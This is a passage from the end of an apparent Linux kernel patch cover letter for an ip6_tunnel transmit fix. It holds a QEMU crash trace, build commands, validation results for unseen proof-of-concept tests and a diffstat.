[    4.898543] RBP: 000000000000000a R08: 00007f3b9a1d0090
R09: 0000000000000010
[    4.899401] R10: 0000000000000000 R11: 0000000000000293
R12: 0000000000000000
[    4.900372] R13: 0000000000000000 R14: 0000000000417740
R15: 00007f3b999d0000
[    4.901214]  </TASK>
[    4.901528] Modules linked in:
[    4.901956] ---[ end trace 0000000000000000 ]---
[    4.902553] RIP: 0010:skb_panic+0xbe/0xc0
[    4.903065] Code: ff 8b 4b 70 48 c7 c7 60 0e f6 b7 41 56 4d 89 f9
41 55 41 54 55 44 8b 44 24 34 48 8b 54 24 28 48 8b 74 24 20 e8 33 ab
d5 fe 90 <0f> 0b 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 f3
0f 1e fa
[    4.905312] RSP: 0018:ffffc900012c71c0 EFLAGS: 00010246
[    4.905973] RAX: 000000000000008a RBX: ffff888003313000
RCX: ffffffffb5ed8b55
[    4.906848] RDX: 0000000000000000 RSI: 0000000000000004
RDI: 0000000000000001
[    4.907783] RBP: ffff8880050e3a7c R08: 0000000000000000
R09: fffffbfff711a524
[    4.908665] R10: 0000000000000003 R11: 203a666675626b73
R12: 00000000000000dc
[    4.909547] R13: 0000000000000180 R14: ffff888002c18120
R15: ffff8880050e3a80
[    4.910428] FS:  00007f3b9a1d0640(0000) GS:ffff88807c2d5000(0000)
knlGS:0000000000000000
[    4.911438] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    4.912216] CR2: 00000000006167e0 CR3: 000000000414e001
CR4: 0000000000370ef0
[    4.913107] Kernel panic - not syncing: Fatal exception in interrupt
[    4.914485] Kernel Offset: 0x34c00000 from 0xffffffff81000000
(relocation range: 0xffffffff80000000-0xffffffffbfffffff)
QEMU_EXIT=0

-----END historical baseline crash log-----

Testing:

    make O=build-verify-v5 olddefconfig
    make O=build-verify-v5 net/ipv6/ip6_tunnel.o

The focused build above passes. The full KASAN kernel also builds
successfully with the PoC initramfs:

    make O=build-verify-v5-kasan olddefconfig
    make O=build-verify-v5-kasan -j$(nproc) bzImage

Validation:

- The kernel boots in QEMU without KASAN reports, skb_under_panic(), oops,
  or panic.
- The check-only PoC reports netlink_error=-22 (Invalid argument),
  mutated=no, and exits 1.
- The race-only PoC exits 0, but reports send_err=-22 and mutated=no; it
  does not exercise the intended race and is not counted as a pass.

Zixuan Chai (1):
  ip6_tunnel: snapshot encap in xmit

 include/net/ip6_tunnel.h | 10 +++++-----
 include/net/ip_tunnels.h | 10 ++++++++++
 net/ipv6/ip6_tunnel.c    | 28 ++++++++++++++++++----------
 3 files changed, 33 insertions(+), 15 deletions(-)

-- 
2.34.1

